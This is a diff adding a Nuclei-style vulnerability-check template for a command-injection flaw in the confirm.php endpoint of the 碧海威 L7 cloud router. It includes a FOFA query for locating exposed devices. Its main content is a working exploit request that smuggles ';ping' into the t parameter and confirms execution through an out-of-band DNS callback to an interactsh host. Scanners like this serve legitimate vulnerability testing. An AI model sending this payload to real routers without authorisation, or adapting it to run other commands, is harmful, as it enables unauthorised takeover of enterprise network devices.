@@ -1,0 +1,24 @@
+id: bihaiwei-l7-router-confirmphp-rce
+info:
+  name: "碧海威L7云路由confirm.php接口命令注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="碧海威L7云路由"
+          碧海威L7云路由confirm.php接口存在命令注入缺陷，该系统作为企业级网络管理解决方案，集成路由、防火墙、流控等核心功能模块。攻击者可通过构造恶意请求在目标系统上执行任意shell命令，实现对底层操作系统的控制。
+  tags: 碧海威L7云路由
+http:
+- raw:
+  - |
+    GET /notice/confirm.php?t=;ping%20-c%203%20{{interactsh-url}} HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
